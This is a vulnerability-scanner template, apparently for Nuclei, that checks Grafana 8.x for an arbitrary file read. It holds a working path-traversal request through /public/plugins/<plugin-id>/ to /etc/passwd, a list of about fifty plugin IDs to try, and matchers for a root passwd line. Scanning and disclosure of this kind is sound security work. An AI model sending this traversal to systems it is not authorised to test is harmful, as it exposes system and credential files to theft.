id: grafana-file-read

info:
  name: Grafana v8.x Arbitrary File Read
  author: z0ne,dhiyaneshDk
  severity: high
  reference:
    - https://nosec.org/home/detail/4914.html
    - https://github.com/jas502n/Grafana-VulnTips
    - https://twitter.com/pyn3rd/status/1468138032477859841
    - https://twitter.com/naglinagli/status/1468155313182416899
  tags: grafana,lfi
  remediation: The latest Grafana unpatched 0 Day LFI  is now being actively exploited, it affects only Grafana 8.0+, Vulnerable companies should revoke the secrets they store at their /etc/grafana/grafana.ini ASAP as there is no official fix in the meantime.

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/{{plugin-id}}/../../../../../../../../../../../../../../../../../../../etc/passwd"

    payloads:
      plugin-id:
        - live
        - logs
        - news
        - stat
        - text
        - loki
        - debug
        - gauge
        - graph
        - table
        - mysql
        - mssql
        - tempo
        - canvas
        - geomap
        - jaeger
        - zipkin
        - heatmap
        - welcome
        - xychart
        - annolist
        - barchart
        - bargauge
        - dashlist
        - piechart
        - influxdb
        - graphite
        - postgres
        - opentsdb
        - testdata
        - alertlist
        - histogram
        - nodeGraph
        - table-old
        - pluginlist
        - timeseries
        - cloudwatch
        - prometheus
        - alertGroups
        - stackdriver
        - elasticsearch
        - gettingstarted
        - state-timeline
        - status-history
        - grafana-clock-panel
        - grafana-simple-json-datasource
        - grafana-azure-monitor-datasource

    stop-at-first-match: true
    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
